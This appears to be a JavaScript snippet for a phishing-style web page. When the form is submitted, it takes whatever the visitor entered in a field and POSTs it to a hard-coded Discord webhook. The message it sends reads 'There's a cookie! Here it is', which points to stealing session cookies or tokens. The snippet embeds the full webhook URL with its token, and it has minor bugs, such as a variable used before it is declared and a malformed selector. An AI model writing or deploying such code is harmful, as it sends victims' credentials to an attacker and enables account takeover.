
var inputElement = document.createElement('input');
inputElement.type = 'text';
document.body.appendChild(inputElement)
inputElement.classList.add("second-input")

const formElement = document.getElementById('my-form');
const whurl = 'https://discord.com/api/webhooks/1121888454867959978/SlauwbctwAQFh69tn4_UpVyT2CYmZm_lpGBP3_9h7_BRaCqEUcNNfwI1kbWKEX15q7SO';
const btn = document.querySelector('submit')



formElement.addEventListener('submit', (event) => {
  event.preventDefault();
  setTimeout(function() {
    inputElement.value = inputValue
  }, 1200);
  const inputValue = document.getElementById('input-field').value;
  const payload = {
    content: 'There\'s a cookie! Here it is: ```\n\n' + inputValue.trim() + "\n```"
  };


  fetch(whurl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  })

});

